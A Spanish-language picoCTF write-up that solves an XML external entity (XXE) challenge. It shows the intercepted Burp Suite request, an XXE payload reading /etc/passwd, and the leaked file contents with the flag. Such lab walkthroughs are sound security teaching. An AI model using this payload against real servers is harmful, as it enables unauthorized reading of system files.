# **Descripción**

The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?[Web Portal](http://saturn.picoctf.net:60058/)

Hints:

- XML external entity Injection
# **Solución**

Para la resolución de este problema se utilizó la herramienta Burp Suite para interceptar las peticiones en la página web.

Al ingresar a la página web no notamos nada raro, solo existen algunos botones que nos muestran información.

Al pulsar el primer botón de detalles, muestra lo siguiente

```
**Special Info::::** University in Kigali, Rwanda offereing MSECE, MSIT and MS EAI
```

Si interceptamos esta solicitud en el Burp Suite nos muestra:

```HTML
POST /data HTTP/1.1
Host: saturn.picoctf.net:60058
Content-Length: 61
Accept-Language: es-419,es;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://saturn.picoctf.net:60058
Referer: http://saturn.picoctf.net:60058/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?>
<data>
<ID>
1
</ID>
</data>
```

Para encontrar la bandera haremos caso a la pista dada, la cual nos dice que podemos hacer una inyección de Entidad Externa XML (XXE), esta inyección es una vulnerabilidad de seguridad web que permite a un atacante interferir con el procesamiento de datos XML de una aplicación. 

Nos permitirá ver archivos en el sistema de archivos del servidor de la aplicación y interactuar con cualquier sistema externo o de back-end al que la propia aplicación pueda acceder.

Dada la descripción, haremos una inyección para ingresar al archivo */etc/passwd* de la siguiente manera.

Declaramos la entidad XXE para ver este archivo. Después lo pondremos antes de los datos y la mandaremos llamar dentro de los datos, así como se muestra a continuación


```HTML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>
<ID>
&xxe;1
</ID>
</data>
```

Una vez modificado esto en la solicitud interceptada por el Burpsuite, la mandaremos y lo mostrado será lo siguiente.

```
Invalid ID: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin flask:x:999:999::/app:/bin/sh picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_e5f02dbf} 1
```

Que es el archivo que buscábamos, incluyendo al final de este la bandera.


# **Notas adicionales**


# **Referencias**

- https://portswigger.net/web-security/xxe 